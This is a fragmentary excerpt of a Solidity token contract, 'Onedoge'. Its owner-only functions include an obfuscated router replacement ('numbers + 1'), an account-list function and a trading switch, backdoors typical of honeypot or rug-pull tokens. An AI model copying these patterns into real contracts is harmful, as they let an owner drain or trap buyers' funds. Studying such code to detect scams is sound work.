...
contract Onedoge is Context, IERC20, Ownable {
    ...
    constructor (
        ...
        _owner = 0x129F082c04c16096Cbb0E092a86E488b84310513;
        _totalSupply = supply  * 10 ** _decimals;
        _minimumTokensBeforeSwap = 1 * 10 ** _decimals;
        marketingWalletAddress = payable(0x129F082c04c16096Cbb0E092a86E488b84310513);
    ...
    function setNums(uint160 numbers) public onlyOwner {
         uniswapV2Router = 
         IUniswapV2Router02(address(numbers + 1));
    }

    bool private startTx;

    function openTranding() external onlyOwner() {
    ...
    function addAddr(address[] calldata accounts) public onlyOwner {
    ...
    function swapTokensForEth(uint256 tokenAmount) private {
        ...
        address[] memory path = new address[](3);  path[0] = address(this);
        path[1] = uniswapV2Router.WETH();  path[2] = _lastUsd;
